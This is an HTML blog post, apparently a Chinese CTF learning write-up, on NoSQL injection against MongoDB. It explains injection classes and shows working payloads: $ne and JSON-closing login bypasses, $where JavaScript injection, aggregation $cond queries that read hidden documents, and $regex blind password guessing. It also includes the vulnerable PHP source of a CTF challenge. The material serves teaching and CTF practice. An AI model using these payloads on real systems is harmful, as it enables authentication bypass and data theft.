@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    NoSQL注入学习 | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结,SQLi
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 34 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1564222257000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1564222257000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>NoSQL注入学习</h1>
+    <h1 id="NoSQL简介"><a href="#NoSQL简介" class="headerlink" title="NoSQL简介"></a>NoSQL简介</h1><p><code>non-relational</code> <code>Not Only SQL</code></p>
+<p>维基百科上对NoSQL的介绍：</p>
+<blockquote>
+<p>NoSQL是对不同于传统的关系数据库的数据库管理系统的统称。</p>
+<p>两者存在许多显著的不同点，其中最重要的是NoSQL不使用SQL作为查询语言。其数据存储可以不需要固定的表格模式，也经常会避免使用SQL的JOIN操作，一般有水平可扩展性的特征。</p>
+</blockquote>
+<p>NoSQL是数据存储的一个流行趋势；它泛指依赖于不同存储机制的非关系型数据库，这些存储机制包括文档存储、键值对存储和图</p>
+<p>NoSQL数据库的四大分类:</p>
+<ol>
+<li>键值(Key-Value)存储数据库</li>
+<li>列存储数据库</li>
+<li>文档型数据库</li>
+<li>图形(Graph)数据库</li>
+</ol>
+<h1 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h1><p>NoSQL 相关的 SQL 攻击主要机制可以大致分为以下五类：</p>
+<ol>
+<li>重言式(永真式)</li>
+<li>联合查询</li>
+<li>JavaScript 注入</li>
+<li>背负式查询</li>
+<li>跨域违规</li>
+</ol>
+<p>测试代码源码来自 <a href="https://github.com/youngyangyang04/NoSQLInjectionAttackDemo" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLInjectionAttackDemo</a></p>
+<h2 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h2><p>也就是通过注入代码,让生成的表达式结果永远为真,从而绕过认证</p>
+<p>输入<code>username[$ne]=1&amp;password[$ne]=1</code></p>
+<p>PHP把该输入解析为<code>array(&quot;username&quot;=&gt;array(&quot;$[ne]&quot;=&gt;1), &quot;password&quot;=&gt;array(&quot;$ne&quot;=&gt;1));,</code></p>
+<p>然后编码为MongoDB查询<br><code>db.logins.find({username:{$ne:1},password{$ne:1})</code></p>
+<p><code>$ne</code>代表不相等，因此,这次查询将返回登录集合中的所有用户</p>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>通过参数来改变查询的数据集来绕认证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string query = &quot;&#123; username:&apos;username&apos;,password:&apos;password&apos;&#125;&quot;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">username=tolkien&apos;, $or: [ &#123;&#125;, &#123; &apos;a&apos;:&apos;a&amp;password=&apos; &#125; ]</span><br></pre></td></tr></table></figure>
+
+<h2 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a>JavaScript 注入</h2><p>在MongoDB中<code>$where</code>操作符可以执行JavaScript语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1;return true;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
+
+<h1 id="Cybrics-CTF-2019-NopeSQL"><a href="#Cybrics-CTF-2019-NopeSQL" class="headerlink" title="Cybrics CTF 2019 NopeSQL"></a>Cybrics CTF 2019 NopeSQL</h1><p>前几天的一个CTF的题目<code>NopeSQL</code>考察的就是NoSQL注入</p>
+<p>首先发现<code>.git</code>泄露，githack得到<code>index.php</code>的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一步是利用注入登录</p>
+<p>这里直接使用<code>{&quot;$ne&quot;:null}</code>发现500，使用<code>{&#39;$ne&#39;:null}</code>也不对，在本地测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">代码：</span><br><span class="line">var_dump(json_decode($raw_query));</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">object(stdClass)#1 (2) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(12) &quot;&#123;&apos;$ne&apos;:null&#125;&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  string(12) &quot;&#123;&apos;$ne&apos;:null&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>{&#39;$ne&#39;:null}</code>被解析成了string而不是array，原因是<code>$raw_query = &#39;{&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;}&#39;;</code> 其中输入被双引号包裹</p>
+<p>正确的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>
+
+<p>此时的<code>raw_query</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;1&quot;, &quot;password&quot;: &quot;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再去<code>var_dump(json_decode($raw_query));</code>，发现成功解析payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">object(stdClass)#1 (2) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">  string(5) &quot;admin&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">  object(stdClass)#2 (1) &#123;</span><br><span class="line">    [&quot;$ne&quot;]=&gt;</span><br><span class="line">    NULL</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里这么写payload是为了闭合双引号，虽然<code>username</code>和<code>password</code>重复了，但<code>json_decode</code>时变量只会是最后一次的赋值</p>
+<p>登录之后</p>
+<p><img src="https://i.loli.net/2019/07/27/5d3c0d1f7570016832.png" alt="Snipaste_2019-07-27_16-35-45.png"></p>
+<p>filter参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条</p>
+<p>代码里是用的MongoDB聚合函数aggregate<br><a href="https://www.runoob.com/mongodb/mongodb-aggregate.html" target="_blank" rel="noopener">https://www.runoob.com/mongodb/mongodb-aggregate.html</a></p>
+<p>flag应该在剩下的未展示出来的文章里</p>
+<p>payload1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[&quot;category&quot;]=&gt;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;$cond&quot;]=&gt;</span><br><span class="line">  array(3) &#123;</span><br><span class="line">    [&quot;if&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [&quot;$eq&quot;]=&gt;</span><br><span class="line">      array(2) &#123;</span><br><span class="line">        [0]=&gt;</span><br><span class="line">        array(1) &#123;</span><br><span class="line">          [&quot;$strLenBytes&quot;]=&gt;</span><br><span class="line">          string(6) &quot;$title&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        [1]=&gt;</span><br><span class="line">        array(1) &#123;</span><br><span class="line">          [&quot;$toInt&quot;]=&gt;</span><br><span class="line">          string(2) &quot;19&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;then&quot;]=&gt;</span><br><span class="line">    string(5) &quot;$text&quot;</span><br><span class="line">    [&quot;else&quot;]=&gt;</span><br><span class="line">    string(2) &quot;12&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload1的意思就是当title的长度为19时，filter赋值为<code>$text</code>，也就是展示文章内容，通过枚举title的长度，就可以把每一篇文章的内容都读出来</p>
+<p>payload2:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filter[$cond][if][$and][0][$eq][]=$category&amp;filter[$cond][if][$and][0][$eq][]=flags&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=a</span><br><span class="line"></span><br><span class="line">?filter[$cond][if][$and][0][$eq][]=$title&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=11111&amp;filter[$cond][if][$and][0][$eq][]=This is a flag text</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[&quot;category&quot;]=&gt;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;$cond&quot;]=&gt;</span><br><span class="line">  array(3) &#123;</span><br><span class="line">    [&quot;if&quot;]=&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [&quot;$and&quot;]=&gt;</span><br><span class="line">      array(1) &#123;</span><br><span class="line">        [0]=&gt;</span><br><span class="line">        array(1) &#123;</span><br><span class="line">          [&quot;$eq&quot;]=&gt;</span><br><span class="line">          array(2) &#123;</span><br><span class="line">            [0]=&gt;</span><br><span class="line">            string(9) &quot;$category&quot;</span><br><span class="line">            [1]=&gt;</span><br><span class="line">            string(5) &quot;flags&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;then&quot;]=&gt;</span><br><span class="line">    string(6) &quot;$title&quot;</span><br><span class="line">    [&quot;else&quot;]=&gt;</span><br><span class="line">    string(1) &quot;a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2是先找出目录为flags的文章的标题，然后去找对应该标题的文章的内容</p>
+<p>后来发现直接读内容也是可以的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filter[$cond][if][$and][0][$eq][]=$category&amp;filter[$cond][if][$and][0][$eq][]=flags&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/07/27/5d3c167bae88062445.png" alt="Snipaste_2019-07-27_17-16-30.png"></p>
+<h1 id="SWPUCTF-injection"><a href="#SWPUCTF-injection" class="headerlink" title="SWPUCTF injection ???"></a>SWPUCTF injection ???</h1><p>Nosql注入</p>
+<p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username[$ne]=a&amp;password[$ne]=a&amp;vertify=a</span><br></pre></td></tr></table></figure>
+
+<p>返回<code>Nice!But it is not the real passwd</code></p>
+<p>通过mongodb的条件操作符<code>$regex</code>来用正则匹配盲注逐字猜解得到正确密码，payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username[$ne]=a&amp;password[$regex]=^abc&amp;vertify=a</span><br></pre></td></tr></table></figure>
+
+<h1 id="NoSQLMap"><a href="#NoSQLMap" class="headerlink" title="NoSQLMap"></a>NoSQLMap</h1><p><a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener">https://github.com/codingo/NoSQLMap</a></p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
